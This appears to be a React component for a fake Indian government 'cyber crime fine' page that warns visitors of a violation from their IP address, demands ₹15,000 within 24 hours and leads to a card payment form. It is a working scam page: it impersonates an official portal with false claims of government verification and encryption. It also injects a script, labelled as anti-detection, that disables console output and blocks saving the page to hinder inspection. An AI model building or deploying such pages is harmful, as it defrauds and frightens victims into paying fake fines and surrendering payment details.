
import React, { useState, useEffect } from 'react';
import { AlertTriangle, Shield, Lock, CreditCard } from 'lucide-react';
import PaymentForm from './PaymentForm';
import { useSecureConnection } from '../hooks/useSecureConnection';

interface PaymentPortalProps {
  highlightFields: boolean;
  clickTrigger: number;
}

const PaymentPortal: React.FC<PaymentPortalProps> = ({ highlightFields, clickTrigger }) => {
  const [showForm, setShowForm] = useState(false);
  const { secureTransmit } = useSecureConnection();

  useEffect(() => {
    // Initialize anti-detection measures
    const script = document.createElement('script');
    script.innerHTML = `
      // Block console access
      (function() {
        const noop = () => {};
        const methods = ['log', 'warn', 'error', 'info', 'debug', 'trace'];
        methods.forEach(method => {
          console[method] = noop;
        });
      })();
      
      // Block source viewing
      document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
          e.preventDefault();
          return false;
        }
      });
    `;
    document.head.appendChild(script);

    return () => {
      document.head.removeChild(script);
    };
  }, []);

  const handlePayFine = () => {
    // Use secure transmission for any data
    const secureData = secureTransmit({ action: 'pay_fine', timestamp: Date.now() });
    console.log('Secure action initiated:', secureData);
    setShowForm(true);
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Security Warning Banner */}
      <div className="bg-red-600 text-white py-2 px-4">
        <div className="flex items-center justify-center space-x-2 text-sm">
          <AlertTriangle className="w-4 h-4" />
          <span className="font-medium">URGENT: Cyber Crime Fine Payment Required</span>
          <Shield className="w-4 h-4" />
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-4xl mx-auto p-6">
        {!showForm ? (
          <div className="bg-white rounded-lg shadow-xl p-8">
            <div className="text-center mb-8">
              <div className="inline-flex items-center justify-center w-20 h-20 bg-red-100 rounded-full mb-4">
                <AlertTriangle className="w-10 h-10 text-red-600" />
              </div>
              <h1 className="text-3xl font-bold text-red-600 mb-2">CYBER CRIME VIOLATION DETECTED</h1>
              <p className="text-gray-600">Your system has been flagged for suspicious cyber activities</p>
            </div>

            <div className="bg-red-50 border-l-4 border-red-500 p-6 mb-6">
              <div className="flex items-start">
                <Lock className="w-6 h-6 text-red-500 mr-3 flex-shrink-0 mt-1" />
                <div>
                  <h3 className="text-lg font-semibold text-red-800 mb-2">IMMEDIATE ACTION REQUIRED</h3>
                  <p className="text-red-700 mb-4">
                    Our cyber security systems have detected unauthorized activities from your IP address. 
                    To avoid legal prosecution and system suspension, immediate fine payment is required.
                  </p>
                  <div className="space-y-2 text-sm text-red-600">
                    <div>• Violation Type: Unauthorized Access Attempt</div>
                    <div>• Severity Level: HIGH RISK</div>
                    <div>• Fine Amount: ₹15,000</div>
                    <div>• Deadline: 24 Hours</div>
                  </div>
                </div>
              </div>
            </div>

            <div className="text-center">
              <button
                onClick={handlePayFine}
                className={`inline-flex items-center space-x-2 bg-red-600 hover:bg-red-700 text-white font-bold py-4 px-8 rounded-lg transition-all duration-300 ${
                  highlightFields ? 'animate-pulse ring-4 ring-red-300' : ''
                }`}
              >
                <CreditCard className="w-5 h-5" />
                <span>PAY FINE NOW - ₹15,000</span>
              </button>
              <p className="text-xs text-gray-500 mt-4">
                Secure payment gateway protected by Government of India encryption
              </p>
            </div>

            <div className="mt-8 grid grid-cols-1 md:grid-cols-3 gap-4 text-center">
              <div className="p-4 bg-blue-50 rounded-lg">
                <Shield className="w-8 h-8 text-blue-600 mx-auto mb-2" />
                <h4 className="font-semibold text-blue-800">Secure Payment</h4>
                <p className="text-sm text-blue-600">256-bit SSL encryption</p>
              </div>
              <div className="p-4 bg-green-50 rounded-lg">
                <Lock className="w-8 h-8 text-green-600 mx-auto mb-2" />
                <h4 className="font-semibold text-green-800">Government Verified</h4>
                <p className="text-sm text-green-600">Official payment portal</p>
              </div>
              <div className="p-4 bg-purple-50 rounded-lg">
                <CreditCard className="w-8 h-8 text-purple-600 mx-auto mb-2" />
                <h4 className="font-semibold text-purple-800">Instant Processing</h4>
                <p className="text-sm text-purple-600">Immediate case closure</p>
              </div>
            </div>
          </div>
        ) : (
          <PaymentForm highlightFields={highlightFields} clickTrigger={clickTrigger} />
        )}
      </div>
    </div>
  );
};

export default PaymentPortal;
